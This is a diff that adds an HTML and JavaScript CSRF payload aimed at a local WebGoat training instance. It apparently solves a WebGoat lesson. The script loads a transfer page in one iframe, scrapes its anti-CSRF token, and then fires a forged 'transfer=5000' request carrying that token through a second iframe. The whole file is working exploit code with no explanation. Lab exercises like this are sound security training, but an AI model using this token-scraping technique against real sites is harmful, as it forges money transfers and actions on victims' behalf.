@@ -1,0 +1,10 @@
+<iframe src='http://localhost:8080/WebGoat/attack?Screen=1469770765&menu=900&transfer=main' id = 'frame1' onload = 'loadSrc()'></iframe>
+<iframe id = 'frame2'></iframe> 
+<script>
+    function loadSrc() {
+        var f1 = document.getElementById("frame1");
+        var f2 = document.getElementById("frame2");
+        var tokenVal = f1.contentWindow.document.getElementsByName("token")[0].value;
+        f2.src = 'http://localhost:8080/WebGoat/attack?transfer=5000&token=' + tokenVal + '#attack/1469770765/900';
+    }
+</script>
